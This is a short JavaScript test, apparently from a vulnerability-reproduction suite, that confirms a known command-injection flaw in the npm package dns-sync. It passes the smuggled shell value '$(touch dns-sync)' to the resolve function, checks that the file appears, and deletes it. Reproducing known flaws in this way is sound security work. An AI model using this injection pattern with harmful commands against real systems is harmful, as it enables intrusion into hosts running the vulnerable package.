//https://snyk.io/vuln/npm:dns-sync:20141111
test("Command Injection in dns-sync", () => 
{
	const dnsSync = require('dns-sync');
	const fs = require('fs');
	const path = './dns-sync';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	dnsSync.resolve('$(touch dns-sync)');
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});